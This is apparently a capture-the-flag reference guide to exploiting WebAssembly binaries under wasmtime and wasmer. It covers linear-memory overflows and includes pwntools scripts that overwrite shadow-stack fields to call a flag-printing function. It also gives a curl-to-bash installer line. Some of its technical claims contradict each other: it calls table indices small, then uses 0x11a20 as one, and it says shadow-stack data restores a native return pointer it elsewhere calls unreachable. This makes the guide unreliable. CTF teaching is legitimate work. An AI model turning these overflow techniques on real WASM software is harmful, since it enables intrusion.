# WASM Binary Exploitation (pwn under wasmtime / Emscripten)

WebAssembly (WASM) challenges run a `.wasm` binary under a host runtime such as `wasmtime`, `wasmer`, or an Emscripten-compiled native loader. The exploit surface is the WASM **linear memory** — a flat byte array that backs all heap and stack allocations for the module.

## Memory Model

- WASM memory is one contiguous linear buffer starting at offset 0.
- The module's shadow stack (for functions that take the address of a local) lives inside linear memory at a known base, typically something like `0x10000`.
- Function pointers are encoded as **table indices**, not raw addresses. The indirect call table is separate from linear memory.
- The host runtime's own stack (native C/C++ call stack) is outside linear memory and normally unreachable.

## Common Vulnerability Patterns

### Buffer Overflow in Linear Memory

A `read()` or `gets()` equivalent in the WASM program writes past a local buffer into the shadow stack frame of the same or a parent function. The overflow can overwrite:

1. **Local shadow-stack return address** — the value the `__stack_chk_fail` equivalent uses to restore the native return pointer. On wasmtime, this is stored as a WASM i32 at the top of the current shadow frame; overwriting it redirects execution within the WASM program.
2. **Function table index** — if a function pointer (stored as an i32 table index) is kept in the shadow stack, overwrite it to call a different WASM function.
3. **A `win` function's table slot** — if the challenge keeps a "print flag" function that is never called, its table index is often small and predictable.

**Recognition signs:**
- Binary is a `.wasm` file launched with `wasmtime ./main.wasm` or `wasmer run main.wasm`
- Standard `checksec` does not apply; mitigations are runtime-level, not kernel-level
- No ASLR on the linear memory layout — offsets are fixed at compile time
- `wasm-objdump -x main.wasm` shows function and memory sections

### Exploiting via Offset-to-Win

When the vulnerability is a simple linear overflow and the module contains a flag-printing function at a known table index:

```python
from pwn import *

# wasmtime launches the .wasm file and reads from stdin
if args.REMOTE:
    p = remote(host, port)
else:
    p = process(["wasmtime", "main.wasm"])

offset = 24          # bytes from buffer start to the overwritten field
win_idx = 0x11a20    # WASM table index of flag function (from wasm-objdump)

payload = b'\x00' * offset + p32(win_idx)
p.sendlineafter(b'?\n', payload)

p.interactive()
```

**Finding `win_idx`:**
```bash
# Decompile WASM to readable text
wasm2wat main.wasm -o main.wat

# Search for the flag-printing function:
grep -n "flag\|getflag\|print_flag" main.wat

# List the function table to find the index
wasm-objdump -x main.wasm | grep -A50 "Table\|Elem"
```

**Finding the overflow offset:**
```bash
# Look at the shadow stack size in the wat file
# Functions that take locals-by-address allocate shadow stack space:
# (global.set $__stack_pointer (i32.sub (global.get $__stack_pointer) (i32.const N)))
grep "stack_pointer" main.wat | head -20
```

### File-Read via Overflow (name-based flag read)

When the challenge reads a filename from user input and opens it:

```python
# Overwrite a buffer that holds a filename
# Null-pad to fill the slot, then overwrite the target field
payload = b'flag.txt'.ljust(28, b'\x00')
payload += p32(0x11d8)    # index of "open and print" function
p.sendlineafter(b'> ', payload)
```

## Tooling

```bash
# Convert .wasm binary to text format (WAT)
wasm2wat main.wasm -o main.wat

# Inspect sections, imports, exports, function table
wasm-objdump -x main.wasm
wasm-objdump -d main.wasm    # disassemble

# Recompile patched WAT back to WASM
wat2wasm main.wat -o main_patched.wasm

# Run with wasmtime
wasmtime main.wasm

# Run with wasmer
wasmer run main.wasm
```

**Install:**
```bash
apt install wabt      # wasm2wat, wat2wasm, wasm-objdump
curl https://wasmtime.dev/install.sh -sSf | bash
```

## Key Insights

- No kernel mitigations (ASLR, NX, PIE) in the classical sense — attack the WASM shadow stack inside linear memory instead.
- Function pointers are table indices (small integers), not addresses. A table of size ~10 means valid indices are 0–9; anything outside is an invalid call trap.
- The shadow stack pointer is a `global` (`$__stack_pointer`). Its initial value and per-frame allocation sizes are visible in the WAT output.
- Mixing i32 and i64 in the WAT can indicate pointer-width issues (32-bit WASM addressing).
- For leaks: WASM programs often print memory content via `write(1, ptr, len)` syscall wrappers; OOB read on the shadow stack can expose values from adjacent frames.
